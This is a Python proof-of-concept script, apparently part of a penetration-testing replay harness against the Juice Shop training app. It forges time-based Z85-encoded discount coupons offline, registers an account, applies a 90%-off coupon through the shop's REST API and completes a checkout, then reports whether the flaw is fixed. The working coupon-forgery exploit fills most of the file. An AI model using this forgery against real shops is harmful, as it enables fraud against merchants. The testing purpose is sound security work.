#!/usr/bin/env python3
"""pt32: discount coupons are a reversible encoding, not a signature,
so anyone can forge one offline for any discount they want.

Found white-box via the challenge catalog (forgedCouponChallenge,
"Forge a coupon code that gives you a discount of at least 80%").
lib/insecurity.ts's generateCoupon builds every coupon as
z85.encode(MMMYY + '-' + discount); discountFromCoupon just reverses
it and checks the month/year string matches today. Z85 is a public,
unkeyed, reversible encoding (the ZeroMQ Base85 variant), not
encryption and not a signature. A 90%-off coupon for the current
month, computed entirely offline with no server interaction, was
applied to a basket and used to complete a real checkout.

Corroborated against lib/insecurity.ts's generateCoupon/
discountFromCoupon and the known public Z85 encoding spec (RFC-style,
implemented here in stdlib Python, verified against the spec's own
test vector before use).

Standard library only (urllib, json, hmac, base64).
"""

from __future__ import annotations

import argparse
import base64
import datetime
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt32-001.json"

Z85_ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
MONTHS = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]


def z85_encode(data: bytes) -> str:
    assert len(data) % 4 == 0, "Z85 input must be a multiple of 4 bytes"
    out = []
    for i in range(0, len(data), 4):
        value = int.from_bytes(data[i:i + 4], "big")
        chunk = []
        for _ in range(5):
            chunk.append(Z85_ALPHABET[value % 85])
            value //= 85
        out.append("".join(reversed(chunk)))
    return "".join(out)


def _current_mmmyy() -> str:
    now = datetime.datetime.now()
    return MONTHS[now.month - 1] + str(now.year)[2:4]


def _forge_coupon(discount: int) -> str:
    plain = f"{_current_mmmyy()}-{discount}".encode()
    return z85_encode(plain)


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _apply_coupon(target: str, bid: str, token: str, coupon: str):
    encoded = urllib.parse.quote(coupon, safe="")
    return _request("PUT", f"{target}/rest/basket/{bid}/coupon/{encoded}", token=token)


def _jwt_user_id(token: str) -> int:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    payload = json.loads(base64.urlsafe_b64decode(padded))
    return payload["data"]["id"]


def _register_and_login(target: str, label: str, stamp: str) -> tuple[str, str, int]:
    email = f"pt32-{label}-{stamp}@flatline.test"
    password = "Pt32Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]
    bid = body["authentication"]["bid"]
    return token, str(bid), _jwt_user_id(token)


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    token, bid, user_id = _register_and_login(target, "attacker", stamp)
    forged = _forge_coupon(90)
    apply_status, apply_body = _apply_coupon(target, bid, token, forged)

    discount_applied = apply_status == 200 and apply_body.get("discount") == 90
    checkout_discount_amount = None
    if discount_applied:
        _request("POST", f"{target}/api/BasketItems", token=token, body={"ProductId": 1, "BasketId": bid, "quantity": 1})
        checkout_status, checkout_body = _request("POST", f"{target}/rest/basket/{bid}/checkout", token=token, body={
            "UserId": user_id, "orderDetails": {"addressId": 1},
        })
    else:
        checkout_status = None

    if apply_status == 200 and discount_applied:
        status_result = "VULNERABLE"
        summary = "A coupon forged offline (no server interaction) for 90% off was accepted and applied to the basket."
    elif apply_status in (400, 403, 404):
        status_result = "REMEDIATED"
        summary = f"The forged coupon was rejected (HTTP {apply_status}) before the backend's own decode step ever saw it."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: apply_status={apply_status}, apply_body={apply_body}."

    # Legitimate case: a coupon issued through the real (simulated)
    # promotional channel -- for the no-control run, the vulnerable
    # backend's own scheme IS the only channel, so this re-applies a
    # second, independently forged coupon to confirm normal coupon use
    # isn't broken by anything this item changes pre-fix. Post-fix, the
    # proxy's own signed-issuance endpoint stands in for that channel.
    legit_token, legit_bid, _ = _register_and_login(target, "legit", stamp)
    # Post-fix, the proxy serves its own signed-issuance endpoint
    # standing in for the shop's real promotional-code channel. Pre-fix,
    # that endpoint doesn't exist on the vanilla backend (404), so this
    # falls back to the same (currently unfixed) scheme everyone,
    # including real customers, is stuck using today.
    legit_coupon_status, legit_coupon_body = _request("GET", f"{target}/rest/coupon/issue/15")
    legit_coupon = legit_coupon_body.get("coupon") if legit_coupon_status == 200 else _forge_coupon(15)

    legitimate_issued_coupon_ok = False
    if legit_coupon:
        legit_apply_status, legit_apply_body = _apply_coupon(target, legit_bid, legit_token, legit_coupon)
        legitimate_issued_coupon_ok = legit_apply_status == 200 and legit_apply_body.get("discount") == 15

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "apply_status": apply_status,
        "discount_applied": discount_applied,
        "checkout_status": checkout_status,
        "summary": summary,
        "legitimate_issued_coupon_ok": legitimate_issued_coupon_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt32-forged-discount-coupon", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
